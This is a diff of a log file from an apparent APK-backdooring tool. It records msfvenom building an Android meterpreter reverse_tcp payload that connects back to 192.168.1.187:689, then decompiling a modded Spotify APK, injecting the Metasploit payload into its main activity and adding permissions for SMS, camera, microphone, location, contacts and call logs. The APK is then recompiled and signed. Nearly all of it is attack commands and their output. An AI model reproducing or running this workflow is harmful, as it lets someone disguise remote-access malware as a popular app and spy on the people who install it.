@@ -1,10 +1,46 @@
+INFO:root:120
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10186 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+DEBUG:root:I: Regular manifest package...
+DEBUG:root:I: Decoding file-resources...
+DEBUG:root:I: Decoding values */* XMLs...
+DEBUG:root:I: Baksmaling classes.dex...
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
 DEBUG:progressbar.utils:wrapping excepthook
 INFO:root:Generating payload...
 DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
 DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
 DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
 DEBUG:root:No encoder or badchars specified, outputting raw payload
-DEBUG:root:Payload size: 10181 bytes
+DEBUG:root:Payload size: 10178 bytes
 DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
 INFO:root:    ... Done
 DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
@@ -34,54 +70,21 @@ DEBUG:root:I: Regular manifest package...
 DEBUG:root:I: Decoding file-resources...
 DEBUG:root:I: Decoding values */* XMLs...
 DEBUG:root:I: Baksmaling classes.dex...
-DEBUG:root:I: Baksmaling classes2.dex...
-DEBUG:root:I: Baksmaling classes3.dex...
-DEBUG:root:I: Copying assets and libs...
-DEBUG:root:I: Copying unknown files...
-DEBUG:root:I: Copying original files...
-INFO:root:    ... Done.
-DEBUG:root:Decompiled to '/home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban'
-INFO:root:Creating folder: '/home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban/smali/com/metasploit/stage'
-INFO:root:Copying file '/home/andrea/Desktop/CyberSecurity/src/payload/smali/com/metasploit/stage/Payload.smali' to '/home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban/smali/com/metasploit/stage'
-INFO:root:The main activity is: 'com.spotify.music.MainActivity'
-DEBUG:root:Reading from Main Activity file
-DEBUG:root:Inserting the payload invocation in the Main Activity
-DEBUG:root:Writing the Main Activity file
-DEBUG:root:Adding permission: 'android.permission.CHANGE_WIFI_STATE'
-DEBUG:root:Adding permission: 'android.permission.ACCESS_COARSE_LOCATION'
-DEBUG:root:Adding permission: 'android.permission.ACCESS_FINE_LOCATION'
-DEBUG:root:Adding permission: 'android.permission.SEND_SMS'
-DEBUG:root:Adding permission: 'android.permission.RECEIVE_SMS'
-DEBUG:root:Adding permission: 'android.permission.RECORD_AUDIO'
-DEBUG:root:Adding permission: 'android.permission.CALL_PHONE'
-DEBUG:root:Adding permission: 'android.permission.READ_CONTACTS'
-DEBUG:root:Adding permission: 'android.permission.WRITE_CONTACTS'
-DEBUG:root:Adding permission: 'android.permission.RECORD_AUDIO'
-DEBUG:root:Adding permission: 'android.permission.WRITE_SETTINGS'
-DEBUG:root:Adding permission: 'android.permission.CAMERA'
-DEBUG:root:Adding permission: 'android.permission.READ_SMS'
-DEBUG:root:Adding permission: 'android.permission.SET_WALLPAPER'
-DEBUG:root:Adding permission: 'android.permission.READ_CALL_LOG'
-DEBUG:root:Adding permission: 'android.permission.WRITE_CALL_LOG'
-DEBUG:root:Adding feature: 'android.hardware.camera.autofocus'
-DEBUG:root:Adding feature: 'android.hardware.microphone'
-INFO:root:Removing decompiled payload...
-INFO:root:    ... Done
-INFO:root:Deleting payload APK...
-INFO:root:    ... Done
-INFO:root:Recompiling Spotify-v8.4.46.575.APK.Anti-Ban to /home/andrea/Desktop/CyberSecurity/src...
-DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar b -o Spotify-v8.4.46.575.APK.Anti-Ban_MOD.apk /home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban'
-DEBUG:root:I: Using Apktool 2.4.1
-DEBUG:root:I: Checking whether sources has changed...
-DEBUG:root:I: Smaling smali folder into classes.dex...
-DEBUG:root:Spotify-v8.4.46.575.APK.Anti-Ban/smali/com/spotify/music/MainActivity.smali[7,0] missing EOF at 'interfaces'
-DEBUG:root:Could not smali file: com/spotify/music/MainActivity.smali
-INFO:root:    ... Done
-INFO:root:Signing 'Spotify-v8.4.46.575.APK.Anti-Ban_MOD.apk'...
-DEBUG:root:Executing command: 'zipalign -f -v 4 Spotify-v8.4.46.575.APK.Anti-Ban_MOD.apk Spotify-v8.4.46.575.APK.Anti-Ban_SIGNED.apk'
-DEBUG:root:Unable to open 'Spotify-v8.4.46.575.APK.Anti-Ban_MOD.apk' as zip archive
-DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apksigner.jar sign --ks /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/debug.keystore --ks-key-alias androiddebugkey -ks-pass pass:android Spotify-v8.4.46.575.APK.Anti-Ban_SIGNED.apk'
-INFO:root:    ... Done.
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
 DEBUG:progressbar.utils:wrapping excepthook
 INFO:root:Generating payload...
 DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
@@ -99,6 +102,202 @@ DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
 DEBUG:root:I: Loading resource table...
 DEBUG:root:I: Decoding AndroidManifest.xml with resources...
 DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10180 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+DEBUG:root:I: Regular manifest package...
+DEBUG:root:I: Decoding file-resources...
+DEBUG:root:I: Decoding values */* XMLs...
+DEBUG:root:I: Baksmaling classes.dex...
+DEBUG:progressbar.utils:wrapping excepthook
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10180 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10184 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+DEBUG:root:I: Regular manifest package...
+DEBUG:root:I: Decoding file-resources...
+DEBUG:root:I: Decoding values */* XMLs...
+DEBUG:root:I: Baksmaling classes.dex...
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10178 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10185 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10187 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10180 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+DEBUG:root:I: Regular manifest package...
+DEBUG:root:I: Decoding file-resources...
+DEBUG:root:I: Decoding values */* XMLs...
+DEBUG:root:I: Baksmaling classes.dex...
+DEBUG:root:I: Copying assets and libs...
+DEBUG:root:I: Copying unknown files...
+DEBUG:root:I: Copying original files...
+INFO:root:    ... Done.
+DEBUG:root:Decompiled to '/home/andrea/Desktop/CyberSecurity/src/payload'
+INFO:root:Decompiling 'Spotify-v8.4.46.575.APK.Anti-Ban.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o Spotify-v8.4.46.575.APK.Anti-Ban ../Spotify-v8.4.46.575.APK.Anti-Ban.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on Spotify-v8.4.46.575.APK.Anti-Ban.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+DEBUG:root:I: Regular manifest package...
+DEBUG:root:I: Decoding file-resources...
+DEBUG:root:I: Decoding values */* XMLs...
+DEBUG:root:I: Baksmaling classes.dex...
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10182 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10178 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+INFO:root:Generating payload...
+DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
+DEBUG:root:No encoder or badchars specified, outputting raw payload
+DEBUG:root:Payload size: 10186 bytes
+DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
+INFO:root:    ... Done
+DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
+DEBUG:root:Creating the APK representation (using ../Spotify-v8.4.46.575.APK.Anti-Ban.apk)
+INFO:root:Decompiling 'payload.apk'...
+DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar d -f -o payload /home/andrea/Desktop/CyberSecurity/src/payload.apk'
+DEBUG:root:I: Using Apktool 2.4.1 on payload.apk
+DEBUG:root:I: Loading resource table...
+DEBUG:root:I: Decoding AndroidManifest.xml with resources...
+DEBUG:root:I: Loading resource table from file: /home/andrea/.local/share/apktool/framework/1.apk
 DEBUG:root:I: Regular manifest package...
 DEBUG:root:I: Decoding file-resources...
 DEBUG:root:I: Decoding values */* XMLs...
@@ -119,54 +318,12 @@ DEBUG:root:I: Decoding file-resources...
 DEBUG:root:I: Decoding values */* XMLs...
 DEBUG:root:I: Baksmaling classes.dex...
 DEBUG:root:I: Baksmaling classes2.dex...
-DEBUG:root:I: Baksmaling classes3.dex...
-DEBUG:root:I: Copying assets and libs...
-DEBUG:root:I: Copying unknown files...
-DEBUG:root:I: Copying original files...
-INFO:root:    ... Done.
-DEBUG:root:Decompiled to '/home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban'
-INFO:root:Creating folder: '/home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban/smali/com/metasploit/stage'
-INFO:root:Copying file '/home/andrea/Desktop/CyberSecurity/src/payload/smali/com/metasploit/stage/Payload.smali' to '/home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban/smali/com/metasploit/stage'
-INFO:root:The main activity is: 'com.spotify.music.MainActivity'
-DEBUG:root:Reading from Main Activity file
-DEBUG:root:Inserting the payload invocation in the Main Activity
-DEBUG:root:Writing the Main Activity file
-DEBUG:root:Adding permission: 'android.permission.CHANGE_WIFI_STATE'
-DEBUG:root:Adding permission: 'android.permission.ACCESS_COARSE_LOCATION'
-DEBUG:root:Adding permission: 'android.permission.ACCESS_FINE_LOCATION'
-DEBUG:root:Adding permission: 'android.permission.SEND_SMS'
-DEBUG:root:Adding permission: 'android.permission.RECEIVE_SMS'
-DEBUG:root:Adding permission: 'android.permission.RECORD_AUDIO'
-DEBUG:root:Adding permission: 'android.permission.CALL_PHONE'
-DEBUG:root:Adding permission: 'android.permission.READ_CONTACTS'
-DEBUG:root:Adding permission: 'android.permission.WRITE_CONTACTS'
-DEBUG:root:Adding permission: 'android.permission.RECORD_AUDIO'
-DEBUG:root:Adding permission: 'android.permission.WRITE_SETTINGS'
-DEBUG:root:Adding permission: 'android.permission.CAMERA'
-DEBUG:root:Adding permission: 'android.permission.READ_SMS'
-DEBUG:root:Adding permission: 'android.permission.SET_WALLPAPER'
-DEBUG:root:Adding permission: 'android.permission.READ_CALL_LOG'
-DEBUG:root:Adding permission: 'android.permission.WRITE_CALL_LOG'
-DEBUG:root:Adding feature: 'android.hardware.camera.autofocus'
-DEBUG:root:Adding feature: 'android.hardware.microphone'
-INFO:root:Removing decompiled payload...
-INFO:root:    ... Done
-INFO:root:Deleting payload APK...
-INFO:root:    ... Done
-INFO:root:Recompiling Spotify-v8.4.46.575.APK.Anti-Ban to /home/andrea/Desktop/CyberSecurity/src...
-DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar b -o Spotify-v8.4.46.575.APK.Anti-Ban_MOD.apk /home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban'
-DEBUG:root:I: Using Apktool 2.4.1
-DEBUG:root:I: Checking whether sources has changed...
-DEBUG:root:I: Smaling smali folder into classes.dex...
-DEBUG:root:Spotify-v8.4.46.575.APK.Anti-Ban/smali/com/spotify/music/MainActivity.smali[7,0] missing EOF at 'interfaces'
-DEBUG:root:Could not smali file: com/spotify/music/MainActivity.smali
-DEBUG:progressbar.utils:wrapping excepthook
 INFO:root:Generating payload...
 DEBUG:root:Executing command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=689 -o /home/andrea/Desktop/CyberSecurity/src/payload.apk'
 DEBUG:root:[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
 DEBUG:root:[-] No arch selected, selecting arch: dalvik from the payload
 DEBUG:root:No encoder or badchars specified, outputting raw payload
-DEBUG:root:Payload size: 10187 bytes
+DEBUG:root:Payload size: 10180 bytes
 DEBUG:root:Saved as: /home/andrea/Desktop/CyberSecurity/src/payload.apk
 INFO:root:    ... Done
 DEBUG:root:Creating the APK representation (using /home/andrea/Desktop/CyberSecurity/src/payload.apk)
@@ -227,10 +384,6 @@ DEBUG:root:Adding permission: 'android.permission.READ_CALL_LOG'
 DEBUG:root:Adding permission: 'android.permission.WRITE_CALL_LOG'
 DEBUG:root:Adding feature: 'android.hardware.camera.autofocus'
 DEBUG:root:Adding feature: 'android.hardware.microphone'
-INFO:root:Removing decompiled payload...
-INFO:root:    ... Done
-INFO:root:Deleting payload APK...
-INFO:root:    ... Done
 INFO:root:Recompiling Spotify-v8.4.46.575.APK.Anti-Ban to /home/andrea/Desktop/CyberSecurity/src...
 DEBUG:root:Executing command: 'java -jar /home/andrea/Desktop/CyberSecurity/src/apk_backdoor/tools/apktool.jar b -o Spotify-v8.4.46.575.APK.Anti-Ban_MOD.apk /home/andrea/Desktop/CyberSecurity/src/Spotify-v8.4.46.575.APK.Anti-Ban'
 DEBUG:root:I: Using Apktool 2.4.1
@@ -3671,14 +3824,14 @@ DEBUG:root:20598560 res/drawable-small-ldpi/driving_onboarding_navigation.png (O
 DEBUG:root:20605803 AndroidManifest.xml (OK - compressed)
 DEBUG:root:20619474 classes3.dex (OK - compressed)
 DEBUG:root:22273850 classes.dex (OK - compressed)
-DEBUG:root:25795697 classes2.dex (OK - compressed)
-DEBUG:root:29113217 lib/armeabi-v7a/liborbit-jni-spotify.so (OK - compressed)
-DEBUG:root:38868856 lib/armeabi-v7a/libcrashlytics.so (OK - compressed)
-DEBUG:root:38969197 lib/armeabi-v7a/libmyspinnative.so (OK - compressed)
-DEBUG:root:39119748 assets/CircularSpUIv3p50-Book.otf (OK - compressed)
-DEBUG:root:39166080 assets/CircularSpUIv3p100-Book.otf (OK - compressed)
